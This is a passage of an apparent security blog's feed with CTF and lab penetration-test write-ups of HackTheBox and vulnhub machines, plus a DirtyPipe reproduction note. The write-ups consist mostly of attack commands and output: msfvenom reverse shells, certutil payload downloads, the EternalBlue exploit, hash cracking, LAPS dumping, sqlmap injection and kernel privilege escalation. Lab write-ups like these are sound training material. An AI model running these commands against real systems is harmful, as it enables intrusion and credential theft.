19/03/2017  01:43 ££    &lt;DIR&gt;          scripts
26/04/2022  02:10 ££             7.168 shell.exe
19/03/2017  01:43 ££    &lt;DIR&gt;          sites
19/03/2017  01:43 ££    &lt;DIR&gt;          themes
19/03/2017  01:42 ££            19.986 update.php
19/03/2017  01:42 ££            10.123 UPGRADE.txt
19/03/2017  01:42 ££             2.200 web.config
19/03/2017  01:42 ££               417 xmlrpc.php
              24 File(s)      1.052.509 bytes
               9 Dir(s)   4.135.747.584 bytes free
               
drupalgeddon2&gt;&gt; systeminfo
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ££
System Boot Time:          26/4/2022, 1:21:12 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.548 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.542 MB
Virtual Memory: In Use:    553 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.128.194


</code></pre>
<p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=9999 -f exe &gt; ./shell.exe</p>
<p>python3 -m http.server 9998</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/shell.exe shell1.exe</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/winPEASx64.exe winPEASx64.exe</p>
<pre><code>drupalgeddon2&gt;&gt; certutil.exe -urlcache -split -f http://10.10.14.6:9998/shell.exe shell1.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

drupalgeddon2&gt;&gt; shell1.exe

</code></pre>
<p>wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py</p>
<p>python2 windows-exploit-suggester.py --update</p>
<p>python2 windows-exploit-suggester.py --database 2022-04-26-mssb.xls --systeminfo 1.txt</p>
<pre><code>[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

</code></pre>
<p>git clone https://github.com/k4u5h41/MS10-059</p>
<p>python3 -m http.server 9998</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/MS10-059.exe MS10-059.exe</p>
<p>nc -nvlp 10000</p>
<p>MS10-059.exe 10.10.14.6 10000</p>
<pre><code>C:\inetpub\drupal-7.54&gt;MS10-059.exe 10.10.14.6 10000  
MS10-059.exe 10.10.14.6 10000
/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Changing registry values...&lt;BR&gt;/Chimichurri/--&gt;Got SYSTEM token...&lt;BR&gt;/Chimichurri/--&gt;Running reverse shell...&lt;BR&gt;/Chimichurri/--&gt;Restoring default registry values...&lt;BR&gt;
</code></pre>
<pre><code>nc -nvlp 10000                 
listening on [any] 10000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.128.194] 50613
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54&gt;whoami
whoami
nt authority\system
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox-blue]]></title>
        <id>https://V-alkoinen.github.io/post/hackthebox-blue/</id>
        <link href="https://V-alkoinen.github.io/post/hackthebox-blue/">
        </link>
        <updated>2022-04-24T06:11:34.000Z</updated>
        <content type="html"><![CDATA[<p> nmap -A -T4 -sV -O -p- 10.129.124.140</p>
<pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-24 15:12 HKT
Nmap scan report for 10.129.124.140
Host is up (0.081s latency).
Not shown: 65526 closed tcp ports (reset)

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/24%OT=135%CT=1%CU=30563%PV=Y%DS=2%DC=T%G=Y%TM=6264F9
OS:2C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M
OS:505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-24T07:15:49
|_  start_date: 2022-04-24T06:10:29
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-24T08:15:51+01:00
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 1s
TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1  80.27 ms 10.10.14.1
2  81.70 ms 10.129.124.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 213.36 seconds
</code></pre>
<p> smbmap -u guest -p &quot;&quot; -H 10.129.124.140</p>
<pre><code>[+] IP: 10.129.124.140:445	Name: 10.129.124.140                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	Share                                             	READ ONLY	
	Users                                             	READ ONLY	
                                                                    
</code></pre>
<p> smbclient //10.129.124.140/Share -U guest</p>
<pre><code>Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Fri Jul 14 21:48:44 2017
  ..                                  D        0  Fri Jul 14 21:48:44 2017

		4692735 blocks of size 4096. 657088 blocks available
smb: \&gt; exit
</code></pre>
<p> smbclient //10.129.124.140/Users -U guest</p>
<pre><code>Enter WORKGROUP\guest's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                  DR        0  Fri Jul 21 14:56:23 2017
  ..                                 DR        0  Fri Jul 21 14:56:23 2017
  Default                           DHR        0  Tue Jul 14 15:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:54:24 2009
  Public                             DR        0  Tue Apr 12 15:51:29 2011

		4692735 blocks of size 4096. 657088 blocks available
smb: \&gt; ls Default
  Default                           DHR        0  Tue Jul 14 15:07:31 2009

		4692735 blocks of size 4096. 657088 blocks available
smb: \&gt; ls Public
  Public                             DR        0  Tue Apr 12 15:51:29 2011

		4692735 blocks of size 4096. 657088 blocks available
smb: \&gt; exit
</code></pre>
<p> nmap -p 445  --script vuln 10.129.124.140</p>
<pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-24 15:32 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.124.140
Host is up (0.083s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 52.46 seconds
</code></pre>
<p> ms17-010<br>
 msfconsole</p>
<pre><code>msf6 auxiliary(admin/smb/ms17_010_command) &gt; search ms17

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank     Check  Description
   -   ----                                                   ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue               2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1   exploit/windows/smb/ms17_010_psexec                    2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2   auxiliary/admin/smb/ms17_010_command                   2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3   auxiliary/scanner/smb/smb_ms17_010                                      normal   No     MS17-010 SMB RCE Detection
   4   exploit/windows/fileformat/office_ms17_11882           2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   5   auxiliary/admin/mssql/mssql_escalate_execute_as                         normal   No     Microsoft SQL Server Escalate EXECUTE AS
   6   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                    normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   7   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                   normal   No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   8   auxiliary/admin/mssql/mssql_enum_sql_logins                             normal   No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   9   auxiliary/admin/mssql/mssql_enum_domain_accounts                        normal   No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   10  exploit/windows/smb/smb_doublepulsar_rce               2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(admin/smb/ms17_010_command) &gt; use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.129.124.140   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] 10.129.124.140:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.124.140:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.124.140:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.124.140:445 - The target is vulnerable.
[*] 10.129.124.140:445 - Connecting to target for exploitation.
[+] 10.129.124.140:445 - Connection established for exploitation.
[+] 10.129.124.140:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.124.140:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.124.140:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.124.140:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.124.140:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.124.140:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.124.140:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.124.140:445 - Sending all but last fragment of exploit packet
[*] 10.129.124.140:445 - Starting non-paged pool grooming
[+] 10.129.124.140:445 - Sending SMBv2 buffers
[+] 10.129.124.140:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.124.140:445 - Sending final SMBv2 buffers.
[*] 10.129.124.140:445 - Sending last fragment of exploit packet!
[*] 10.129.124.140:445 - Receiving response from exploit packet
[+] 10.129.124.140:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.124.140:445 - Sending egg to corrupted connection.
[*] 10.129.124.140:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.124.140
[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.129.124.140:49158 ) at 2022-04-24 16:02:23 +0800
[+] 10.129.124.140:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.124.140:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.124.140:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter &gt; shell
Process 744 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox-Timelapse]]></title>
        <id>https://V-alkoinen.github.io/post/hackthebox-timelapse/</id>
        <link href="https://V-alkoinen.github.io/post/hackthebox-timelapse/">
        </link>
        <updated>2022-04-21T13:07:59.000Z</updated>
        <content type="html"><![CDATA[<h1 id="目标">目标</h1>
<p> Timelapse 10.129.227.113</p>
<h1 id="过程">过程</h1>
<p> 信息收集</p>
<pre><code>nmap -A -T4 -sV -O -p- 10.129.227.113
smbmap -u guest -p &quot;&quot; -H 10.129.227.113
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650546777556.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650546790039.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650546859290.png" alt="" loading="lazy"><br>
 看到 ipc$ 和 Shares目录可以连接</p>
<pre><code>smbclient //10.129.227.113/ipc$ -U guest%
smbclient //10.129.227.113/Shares -U guest%
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650546922230.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650546988475.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650546992534.png" alt="" loading="lazy"><br>
 发现一个winrm的备份文件，直接解压需要密码，用john跑一下。</p>
<pre><code>zip2john winrm_backup.zip &gt; hash
john hash –wordlist=/usr/share/wordlist/rockyou.txt
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650547121900.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650547126936.png" alt="" loading="lazy"><br>
 解压出来一个pfx文件，Pfx文件提取文件参考：<a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p>
<pre><code>python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; hash1
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash1
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650547185632.png" alt="" loading="lazy"><br>
 密码：<code>thuglegacy</code></p>
<pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out time.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out time.crt
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650547831298.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650547835528.png" alt="" loading="lazy"><br>
 <a href="https://www.speedguide.net/port.php?port=5986">https://www.speedguide.net/port.php?port=5986</a><br>
<img src="https://V-alkoinen.github.io/post-images/1650547867085.png" alt="" loading="lazy"><br>
 <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a><br>
<img src="https://V-alkoinen.github.io/post-images/1650547883713.png" alt="" loading="lazy"></p>
<pre><code>gem install evil-winrm
evil-winrm -S -i 10.129.227.113 -c time.crt -k time.key -u '' -p ''
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650547917021.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650547922557.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650547937148.png" alt="" loading="lazy"></p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe &gt; ./shell.exe
upload /home/sec/laobai/timelapse/shell.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.6
set lport 4444
exploit
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650547970609.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650547974860.png" alt="" loading="lazy"><br>
 下载辅助提权脚本<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
<pre><code>certutil.exe -urlcache -split -f http://10.10.14.6:8888/winPEASx64.exe winPEASx64.exe
.\winPEASx64.exe &gt; ll.txt
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650548077168.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650548081491.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650548085865.png" alt="" loading="lazy"><br>
 <Powershell history><br>
<img src="https://V-alkoinen.github.io/post-images/1650548111391.png" alt="" loading="lazy"></p>
<pre><code>Svc_deploy 
E3R$Q62^12p7PLlC%KWaxuaV

#使用laps脚本列出机器存储的密码
git clone https://github.com/n00py/LAPSDumper
python3 laps.py -u Svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650548167966.png" alt="" loading="lazy"><br>
 pth</p>
<pre><code>crackmapexec smb 10.129.227.113 -u administrator -p '7C@,+-v-+4$f0--h!V9]Jv#.' -X '.\Users\svc_deploy\Documents\shell.exe'
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650548533573.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1650548538311.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DC-3]]></title>
        <id>https://V-alkoinen.github.io/post/dc-3/</id>
        <link href="https://V-alkoinen.github.io/post/dc-3/">
        </link>
        <updated>2022-04-09T11:14:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="目标机器">目标机器</h1>
<p>  DC-3 172.16.70.155</p>
<h1 id="过程">过程</h1>
<p>  nmap扫一下端口和服务<br>
  <code>nmap -A -T4 -sV -O -p- 172.16.70.155</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649848593916.png" alt="" loading="lazy"><br>
  发现一个<code>joomla</code><br>
  爆破一下目录<code>dirb http://172.16.70.155</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649848761350.png" alt="" loading="lazy"><br>
  扫到了administrator目录<br>
  <code>joomscan -u http://172.16.70.155</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849010969.png" alt="" loading="lazy"><br>
  发现版本为3.7，exploitdb找一下<br>
  <code>searchsploit joomla 3.7</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849088813.png" alt="" loading="lazy"><br>
  <code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849123284.png" alt="" loading="lazy"><br>
  直接上SQLMAP<br>
  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849166250.png" alt="" loading="lazy"><br>
  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb –tables</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849202458.png" alt="" loading="lazy"><br>
  找到一个users表<br>
  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' --dump</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849239793.png" alt="" loading="lazy"><br>
  用join跑一下<br>
  <code>john 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849296584.png" alt="" loading="lazy"><br>
  登陆后台<br>
  <code>http://172.16.70.155/administrator/index.php	admin snoopy</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649849348346.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1649849359827.png" alt="" loading="lazy"><br>
  写一个马<br>
<img src="https://V-alkoinen.github.io/post-images/1649849376952.png" alt="" loading="lazy"></p>
<pre><code>nc –nvlp 9999
http://172.16.70.155/templates/beez3//html/1.php
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1649849407505.png" alt="" loading="lazy"><br>
  试一下suid</p>
<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid.py
chmod +x suid.py
python suid.py
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1649849466970.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1649849472092.png" alt="" loading="lazy"></p>
<pre><code>cat /proc/version
cat /etc/issue
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1649849502745.png" alt="" loading="lazy"><br>
  <code>searchsploit ubuntu 16.04</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649850024090.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1649850032190.png" alt="" loading="lazy"><br>
  <code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code><br>
<img src="https://V-alkoinen.github.io/post-images/1649850053274.png" alt="" loading="lazy"></p>
<pre><code>unzip 397
tar -xvf exp
cd 39772
./compile.sh
./doubleput
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1649850091574.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1649850095945.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1649850100090.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2022-0847 DirtyPipe]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/">
        </link>
        <updated>2022-03-09T09:19:03.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞描述">一、漏洞描述</h1>
<p>  <code>CVE-2022-0847</code>是Linux内核中的一个漏洞，利用该漏洞可以覆盖任意只读文件中的数据，因此导致本地权限提升，<code>DirtyPipe</code>类似于<code>DirtyCow</code>，但更容易利用。</p>
<h1 id="二-漏洞影响">二、漏洞影响</h1>
<p>  5.8 &lt;= Linux Kernel &lt; 5.16.11/5.15.25/5.10.102</p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<pre><code>git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
gcc exploit.c -o exp
./exp
su root //使用 aaron 即可切换root用户
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1647077626351.png" alt="" loading="lazy"></figure>
<h1 id="四-漏洞修复">四、漏洞修复</h1>
<p>  升级Linux内核版本：<br>
  Linux Kernel &gt;= 5.16.11<br>
  Linux Kernel &gt;= 5.15.25<br>
  Linux Kernel &gt;= 5.10.102</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vulnstack 9]]></title>
        <id>https://V-alkoinen.github.io/post/vulnstack-9/</id>
        <link href="https://V-alkoinen.github.io/post/vulnstack-9/">
        </link>
        <updated>2022-03-03T12:25:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="过程">过程</h1>
<p> <code>nmap -T4 -Pn -sV -O 10.100.202.45</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816095419.png" alt="" loading="lazy"></p>
<pre><code>http://10.100.202.45:81/ 
